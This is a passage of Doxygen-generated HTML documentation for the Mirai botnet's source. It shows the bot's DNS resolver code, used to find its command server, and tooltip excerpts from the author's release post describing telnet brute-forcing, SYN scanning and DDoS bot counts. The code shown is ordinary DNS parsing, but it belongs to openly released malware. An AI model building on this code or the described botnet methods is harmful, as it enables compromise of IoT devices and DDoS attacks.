name="l00182"></a><span class="lineno">  182</span>&#160;</div><div class="line"><a name="l00183"></a><span class="lineno">  183</span>&#160;                r_data = (<span class="keyword">struct </span><a class="code" href="structdns__resource.html">dns_resource</a> *)name;</div><div class="line"><a name="l00184"></a><span class="lineno">  184</span>&#160;                name = name + <span class="keyword">sizeof</span>(<span class="keyword">struct </span><a class="code" href="structdns__resource.html">dns_resource</a>);</div><div class="line"><a name="l00185"></a><span class="lineno">  185</span>&#160;</div><div class="line"><a name="l00186"></a><span class="lineno">  186</span>&#160;                <span class="keywordflow">if</span> (r_data-&gt;<a class="code" href="structdns__resource.html#a12ad9f090d226ef69b3f68552fa47e82">type</a> == htons(<a class="code" href="protocol_8h.html#a83ac410cc49f839586f7c3f67c82a8fd">PROTO_DNS_QTYPE_A</a>) &amp;&amp; r_data-&gt;<a class="code" href="structdns__resource.html#aea473802a4706a1108914b5521823923">_class</a> == htons(<a class="code" href="protocol_8h.html#a901b19f9dfb79c07984d5f8bf8b2a62c">PROTO_DNS_QCLASS_IP</a>))</div><div class="line"><a name="l00187"></a><span class="lineno">  187</span>&#160;                {</div><div class="line"><a name="l00188"></a><span class="lineno">  188</span>&#160;                    <span class="keywordflow">if</span> (ntohs(r_data-&gt;<a class="code" href="structdns__resource.html#a574bb96e5f68d1d3c7b3ce8309c83592">data_len</a>) == 4)</div><div class="line"><a name="l00189"></a><span class="lineno">  189</span>&#160;                    {</div><div class="line"><a name="l00190"></a><span class="lineno">  190</span>&#160;                        uint32_t *p;</div><div class="line"><a name="l00191"></a><span class="lineno">  191</span>&#160;                        uint8_t tmp_buf[4];</div><div class="line"><a name="l00192"></a><span class="lineno">  192</span>&#160;                        <span class="keywordflow">for</span>(i = 0; i &lt; 4; i++)</div><div class="line"><a name="l00193"></a><span class="lineno">  193</span>&#160;                            tmp_buf[i] = name[i];</div><div class="line"><a name="l00194"></a><span class="lineno">  194</span>&#160;</div><div class="line"><a name="l00195"></a><span class="lineno">  195</span>&#160;                        p = (uint32_t *)tmp_buf;</div><div class="line"><a name="l00196"></a><span class="lineno">  196</span>&#160;</div><div class="line"><a name="l00197"></a><span class="lineno">  197</span>&#160;                        entries-&gt;<a class="code" href="structresolv__entries.html#acaba3f499c8df1106a5c1d59c5a8276e">addrs</a> = realloc(entries-&gt;<a class="code" href="structresolv__entries.html#acaba3f499c8df1106a5c1d59c5a8276e">addrs</a>, (entries-&gt;<a class="code" href="structresolv__entries.html#ae8dc7d2d70c332fd5d30a18790e88d07">addrs_len</a> + 1) * sizeof (<a class="code" href="loader_2src_2headers_2includes_8h.html#aaadf2e480fd246ff9e932039b223baed">ipv4_t</a>));</div><div class="line"><a name="l00198"></a><span class="lineno">  198</span>&#160;                        entries-&gt;<a class="code" href="structresolv__entries.html#acaba3f499c8df1106a5c1d59c5a8276e">addrs</a>[entries-&gt;<a class="code" href="structresolv__entries.html#ae8dc7d2d70c332fd5d30a18790e88d07">addrs_len</a>++] = (*p);</div><div class="line"><a name="l00199"></a><span class="lineno">  199</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00200"></a><span class="lineno">  200</span>&#160;                        printf(<span class="stringliteral">&quot;[resolv] Found IP address: %08x\n&quot;</span>, (*p));</div><div class="line"><a name="l00201"></a><span class="lineno">  201</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00202"></a><span class="lineno">  202</span>&#160;                    }</div><div class="line"><a name="l00203"></a><span class="lineno">  203</span>&#160;</div><div class="line"><a name="l00204"></a><span class="lineno">  204</span>&#160;                    name = name + ntohs(r_data-&gt;<a class="code" href="structdns__resource.html#a574bb96e5f68d1d3c7b3ce8309c83592">data_len</a>);</div><div class="line"><a name="l00205"></a><span class="lineno">  205</span>&#160;                } <span class="keywordflow">else</span> {</div><div class="line"><a name="l00206"></a><span class="lineno">  206</span>&#160;                    <a class="code" href="resolv_8c.html#ab3297f1db6e1da895a374bd7e476a3d2">resolv_skip_name</a>(name, response, &amp;stop);</div><div class="line"><a name="l00207"></a><span class="lineno">  207</span>&#160;                    name = name + stop;</div><div class="line"><a name="l00208"></a><span class="lineno">  208</span>&#160;                }</div><div class="line"><a name="l00209"></a><span class="lineno">  209</span>&#160;            }</div><div class="line"><a name="l00210"></a><span class="lineno">  210</span>&#160;        }</div><div class="line"><a name="l00211"></a><span class="lineno">  211</span>&#160;</div><div class="line"><a name="l00212"></a><span class="lineno">  212</span>&#160;        <span class="keywordflow">break</span>;</div><div class="line"><a name="l00213"></a><span class="lineno">  213</span>&#160;    }</div><div class="line"><a name="l00214"></a><span class="lineno">  214</span>&#160;</div><div class="line"><a name="l00215"></a><span class="lineno">  215</span>&#160;    <a class="code" href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a>(fd);</div><div class="line"><a name="l00216"></a><span class="lineno">  216</span>&#160;</div><div class="line"><a name="l00217"></a><span class="lineno">  217</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00218"></a><span class="lineno">  218</span>&#160;    printf(<span class="stringliteral">&quot;Resolved %s to %d IPv4 addresses\n&quot;</span>, <a class="code" href="ForumPost_8txt.html#ae4b9f60da1e934a3855a3b52163fa058">domain</a>, entries-&gt;<a class="code" href="structresolv__entries.html#ae8dc7d2d70c332fd5d30a18790e88d07">addrs_len</a>);</div><div class="line"><a name="l00219"></a><span class="lineno">  219</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00220"></a><span class="lineno">  220</span>&#160;</div><div class="line"><a name="l00221"></a><span class="lineno">  221</span>&#160;    <span class="keywordflow">if</span> (entries-&gt;<a class="code" href="structresolv__entries.html#ae8dc7d2d70c332fd5d30a18790e88d07">addrs_len</a> &gt; 0)</div><div class="line"><a name="l00222"></a><span class="lineno">  222</span>&#160;        <span class="keywordflow">return</span> entries;</div><div class="line"><a name="l00223"></a><span class="lineno">  223</span>&#160;    <span class="keywordflow">else</span></div><div class="line"><a name="l00224"></a><span class="lineno">  224</span>&#160;    {</div><div class="line"><a name="l00225"></a><span class="lineno">  225</span>&#160;        <a class="code" href="resolv_8c.html#afddedcd192860f219d5bc41b48de7055">resolv_entries_free</a>(entries);</div><div class="line"><a name="l00226"></a><span class="lineno">  226</span>&#160;        <span class="keywordflow">return</span> NULL;</div><div class="line"><a name="l00227"></a><span class="lineno">  227</span>&#160;    }</div><div class="line"><a name="l00228"></a><span class="lineno">  228</span>&#160;}</div><div class="ttc" id="structdns__resource_html_a574bb96e5f68d1d3c7b3ce8309c83592"><div class="ttname"><a href="structdns__resource.html#a574bb96e5f68d1d3c7b3ce8309c83592">dns_resource::data_len</a></div><div class="ttdeci">uint16_t data_len</div><div class="ttdef"><b>Definition:</b> <a href="protocol_8h_source.html#l00018">protocol.h:18</a></div></div>
<div class="ttc" id="structdnshdr_html"><div class="ttname"><a href="structdnshdr.html">dnshdr</a></div><div class="ttdef"><b>Definition:</b> <a href="protocol_8h_source.html#l00007">protocol.h:7</a></div></div>
<div class="ttc" id="mirai_2bot_2util_8c_html_af2f61b2c3c38da3f06a301c596b5b47d"><div class="ttname"><a href="mirai_2bot_2util_8c.html#af2f61b2c3c38da3f06a301c596b5b47d">util_zero</a></div><div class="ttdeci">void util_zero(void *buf, int len)</div><div class="ttdef"><b>Definition:</b> <a href="mirai_2bot_2util_8c_source.html#l00080">util.c:80</a></div></div>
<div class="ttc" id="ForumPost_8txt_html_ae4b9f60da1e934a3855a3b52163fa058"><div class="ttname"><a href="ForumPost_8txt.html#ae4b9f60da1e934a3855a3b52163fa058">domain</a></div><div class="ttdeci">try harder skiddo Your skeleton tool sucks it thought the attack decoder was sinden but it does not even use a text based protocol CNC and bot communicate over binary protocol you say some others kill based on cwd It shows how out of the loop you are with real malware Go back to skidland slaps for you Why are you writing reverse engineer tools You cannot even correctly reverse in the first place Please learn some skills first before trying to impress others Your arrogance in declaring how you beat me with your dumb kung fu statement made me laugh so hard while eating my SO had to pat me on the back Just as I forever be you will be doomed to mediocracy forever Requirements Bare Minimum for scan and for loading Pro for scanReceiver and distributor server for bots resolve a domain(resolv.c/resolv.h) and connect to that IP address-Bots brute telnet using an advanced SYN scanner that is around 80x faster than the one in qbot</div></div>
<div class="ttc" id="wget_8c_html_aa8318fbee111c5bde5952c63e894c962"><div class="ttname"><a href="wget_8c.html#aa8318fbee111c5bde5952c63e894c962">socket</a></div><div class="ttdeci">#define socket</div><div class="ttdef"><b>Definition:</b> <a href="wget_8c_source.html#l00047">wget.c:47</a></div></div>
<div class="ttc" id="wget_8c_html_a9c7f6d5331abb2692a876d5ee67474b7"><div class="ttname"><a href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a></div><div class="ttdeci">#define close</div><div class="ttdef"><b>Definition:</b> <a href="wget_8c_source.html#l00052">wget.c:52</a></div></div>
<div class="ttc" id="structdnshdr_html_acfe83574de35456f80abcbc7d0fe8472"><div class="ttname"><a href="structdnshdr.html#acfe83574de35456f80abcbc7d0fe8472">dnshdr::opts</a></div><div class="ttdeci">uint16_t opts</div><div class="ttdef"><b>Definition:</b> <a href="protocol_8h_source.html#l00008">protocol.h:8</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_aaadf2e480fd246ff9e932039b223baed"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#aaadf2e480fd246ff9e932039b223baed">ipv4_t</a></div><div class="ttdeci">uint32_t ipv4_t</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00013">includes.h:13</a></div></div>
<div class="ttc" id="mirai_2bot_2util_8c_html_a181a242a15f441fe3eefe68330b0c8e3"><div class="ttname"><a href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a></div><div class="ttdeci">int util_strlen(char *str)</div><div class="ttdef"><b>Definition:</b> <a href="mirai_2bot_2util_8c_source.html#l00021">util.c:21</a></div></div>
<div class="ttc" id="structdnshdr_html_a4951db0facef059a5df0879eaa251f33"><div class="ttname"><a href="structdnshdr.html#a4951db0facef059a5df0879eaa251f33">dnshdr::ancount</a></div><div class="ttdeci">uint16_t ancount</div><div class="ttdef"><b>Definition:</b> <a href="protocol_8h_source.html#l00008">protocol.h:8</a></div></div>
<div class="ttc" id="structdns__resource_html"><div class="ttname"><a href="structdns__resource.html">dns_resource</a></div><div class="ttdef"><b>Definition:</b> <a href="protocol_8h_source.html#l00015">protocol.h:15</a></div></div>
<div class="ttc" id="resolv_8c_html_ab3297f1db6e1da895a374bd7e476a3d2"><div class="ttname"><a href="resolv_8c.html#ab3297f1db6e1da895a374bd7e476a3d2">resolv_skip_name</a></div><div class="ttdeci">static void resolv_skip_name(uint8_t *reader, uint8_t *buffer, int *count)</div><div class="ttdef"><b>Definition:</b> <a href="resolv_8c_source.html#l00046">resolv.c:46</a></div></div>
<div class="ttc" id="structdns__resource_html_aea473802a4706a1108914b5521823923"><div class="ttname"><a href="structdns__resource.html#aea473802a4706a1108914b5521823923">dns_resource::_class</a></div><div class="ttdeci">uint16_t _class</div><div class="ttdef"><b>Definition:</b> <a href="protocol_8h_source.html#l00016">protocol.h:16</a></div></div>
<div class="ttc" id="resolv_8c_html_a34ff8173133c46ba5f52a187392bb1db"><div class="ttname"><a href="resolv_8c.html#a34ff8173133c46ba5f52a187392bb1db">resolv_domain_to_hostname</a></div><div class="ttdeci">void resolv_domain_to_hostname(char *dst_hostname, char *src_domain)</div><div class="ttdef"><b>Definition:</b> <a href="resolv_8c_source.html#l00021">resolv.c:21</a></div></div>
<div class="ttc" id="protocol_8h_html_a83ac410cc49f839586f7c3f67c82a8fd"><div class="ttname"><a href="protocol_8h.html#a83ac410cc49f839586f7c3f67c82a8fd">PROTO_DNS_QTYPE_A</a></div><div class="ttdeci">#define PROTO_DNS_QTYPE_A</div><div class="ttdef"><b>Definition:</b> <a href="protocol_8h_source.html#l00025">protocol.h:25</a></div></div>
<div class="ttc" id="structresolv__entries_html_acaba3f499c8df1106a5c1d59c5a8276e"><div class="ttname"><a href="structresolv__entries.html#acaba3f499c8df1106a5c1d59c5a8276e">resolv_entries::addrs</a></div><div class="ttdeci">ipv4_t * addrs</div><div class="ttdef"><b>Definition:</b> <a href="resolv_8h_source.html#l00007">resolv.h:7</a></div></div>
<div class="ttc" id="structdns__question_html_a28612cf31ea9061817c7652d97f68f10"><div class="ttname"><a href="structdns__question.html#a28612cf31ea9061817c7652d97f68f10">dns_question::qtype</a></div><div class="ttdeci">uint16_t qtype</div><div class="ttdef"><b>Definition:</b> <a href="protocol_8h_source.html#l00012">protocol.h:12</a></div></div>
<div class="ttc" id="protocol_8h_html_a901b19f9dfb79c07984d5f8bf8b2a62c"><div class="ttname"><a href="protocol_8h.html#a901b19f9dfb79c07984d5f8bf8b2a62c">PROTO_DNS_QCLASS_IP</a></div><div class="ttdeci">#define PROTO_DNS_QCLASS_IP</div><div class="ttdef"><b>Definition:</b> <a href="protocol_8h_source.html#l00026">protocol.h:26</a></div></div>
<div class="ttc" id="rand_8c_html_accf5c4faf4fb7eb9d74bbf1764921b00"><div class="ttname"><a href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a></div><div class="ttdeci">uint32_t rand_next(void)</div><div class="ttdef"><b>Definition:</b> <a href="rand_8c_source.html#l00021">rand.c:21</a></div></div>
<div class="ttc" id="resolv_8c_html_afddedcd192860f219d5bc41b48de7055"><div class="ttname"><a href="resolv_8c.html#afddedcd192860f219d5bc41b48de7055">resolv_entries_free</a></div><div class="ttdeci">void resolv_entries_free(struct resolv_entries *entries)</div><div class="ttdef"><b>Definition:</b> <a href="resolv_8c_source.html#l00230">resolv.c:230</a></div></div>
<div class="ttc" id="structresolv__entries_html"><div class="ttname"><a href="structresolv__entries.html">resolv_entries</a></div><div class="ttdef"><b>Definition:</b> <a href="resolv_8h_source.html#l00005">resolv.h:5</a></div></div>
<div class="ttc" id="structdns__resource_html_a12ad9f090d226ef69b3f68552fa47e82"><div class="ttname"><a href="structdns__resource.html#a12ad9f090d226ef69b3f68552fa47e82">dns_resource::type</a></div><div class="ttdeci">uint16_t type</div><div class="ttdef"><b>Definition:</b> <a href="protocol_8h_source.html#l00016">protocol.h:16</a></div></div>
<div class="ttc" id="structdns__question_html"><div class="ttname"><a href="structdns__question.html">dns_question</a></div><div class="ttdef"><b>Definition:</b> <a href="protocol_8h_source.html#l00011">protocol.h:11</a></div></div>
<div class="ttc" id="structdns__question_html_afe96f7c0e33a7f83e289140633217017"><div class="ttname"><a href="structdns__question.html#afe96f7c0e33a7f83e289140633217017">dns_question::qclass</a></div><div class="ttdeci">uint16_t qclass</div><div class="ttdef"><b>Definition:</b> <a href="protocol_8h_source.html#l00012">protocol.h:12</a></div></div>
<div class="ttc" id="mirai_2bot_2includes_8h_html_a31dbe0466c76698ccd7b518deec33c7c"><div class="ttname"><a href="mirai_2bot_2includes_8h.html#a31dbe0466c76698ccd7b518deec33c7c">INET_ADDR</a></div><div class="ttdeci">#define INET_ADDR(o1, o2, o3, o4)</div><div class="ttdef"><b>Definition:</b> <a href="mirai_2bot_2includes_8h_source.html#l00018">includes.h:18</a></div></div>
<div class="ttc" id="structdnshdr_html_a72d8ea566565d7c17e1cda9a6260be0b"><div class="ttname"><a href="structdnshdr.html#a72d8ea566565d7c17e1cda9a6260be0b">dnshdr::id</a></div><div class="ttdeci">uint16_t id</div><div class="ttdef"><b>Definition:</b> <a href="protocol_8h_source.html#l00008">protocol.h:8</a></div></div>
<div class="ttc" id="structresolv__entries_html_ae8dc7d2d70c332fd5d30a18790e88d07"><div class="ttname"><a href="structresolv__entries.html#ae8dc7d2d70c332fd5d30a18790e88d07">resolv_entries::addrs_len</a></div><div class="ttdeci">uint8_t addrs_len</div><div class="ttdef"><b>Definition:</b> <a href="resolv_8h_source.html#l00006">resolv.h:6</a></div></div>
<div class="ttc" id="ForumPost_8txt_html_a3eaa76d3cfe977972a9bf87dbc12c50f"><div class="ttname"><a href="ForumPost_8txt.html#a3eaa76d3cfe977972a9bf87dbc12c50f">connect</a></div><div class="ttdeci">World s Largest Echo CNC source code release Anna When I first go in DDoS I wasn t planning on staying in it long I made my there s lots of eyes looking at IOT so it s time to GTFO I know every skid and their it s their wet dream to have something besides qbot So I have an amazing release for you With I usually pull max bots from telnet alone after the Kreb ISPs been slowly shutting down and cleaning up their act max pull is about and dropping I am your and I will treat you real my hf chan And to everyone that thought they were doing anything by hitting my I had good this bot uses domain for CNC It takes seconds for all bots to lol shoutout to this blog post by malwaremustdie thought you were good but you really just completely and totally failed in reversing this binary We still have better kung fu than you kiddos don t make me laugh you made so many mistakes and even confused some different binaries with my LOL Let me give you some slaps back port is not for back connect</div><div class="ttdef"><b>Definition:</b> <a href="ForumPost_8txt_source.html#l00001">ForumPost.txt:1</a></div></div>
<div class="ttc" id="structdnshdr_html_a85cb57fcbd654e84d28c30e5bfa844c4"><div class="ttname"><a href="structdnshdr.html#a85cb57fcbd654e84d28c30e5bfa844c4">dnshdr::qdcount</a></div><div class="ttdeci">uint16_t qdcount</div><div class="ttdef"><b>Definition:</b> <a href="protocol_8h_source.html#l00008">protocol.h:8</a></div></div>
</div><!-- fragment -->
</div>
</div>
</div><!-- contents -->
</div><!-- doc-content -->
<!-- start footer part -->
<div id="nav-path" class="navpath"><!-- id is needed for treeview function! -->
  <ul>
    <li class="navelem"><a class="el" href="dir_526aa88726c618d995900bd3fb6ff493.html">mirai</a></li><li class="navelem"><a class="el" href="dir_fc79afbdad77ef6ec155f6566a92d41a.html">bot</a></li><li class="navelem"><a class="el" href="resolv_8h.html">resolv.h</a></li>
    <li class="footer">Generated by
    <a href="http://www.doxygen.org/index.html">
    <img class="footer" src="doxygen.png" alt="doxygen"/></a> 1.8.11 </li>
  </ul>
</div>
</body>
</html>
